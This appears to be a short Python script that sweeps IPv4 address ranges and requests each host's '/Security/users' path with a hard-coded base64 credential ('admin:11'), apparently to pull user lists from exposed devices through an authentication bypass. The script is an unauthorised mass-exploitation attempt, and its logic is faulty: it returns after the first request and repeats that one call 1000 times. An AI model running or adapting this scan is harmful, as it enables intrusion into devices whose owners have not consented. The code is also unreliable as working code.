import requests


def parse():
    try:
        for a in range(2,249):
            for b in range(2,200):
                for c in range(2,200):
                    for d in range(2,200):
                        s = requests.get(f" http://{a}.{b}.{c}.{d}/Security/users?auth=YWRtaW46MTEK")
                        print(s)
                        return s.status_code
                    
    except Exception as e:
        print('Error')



for _ in range(1000):
    print(parse())


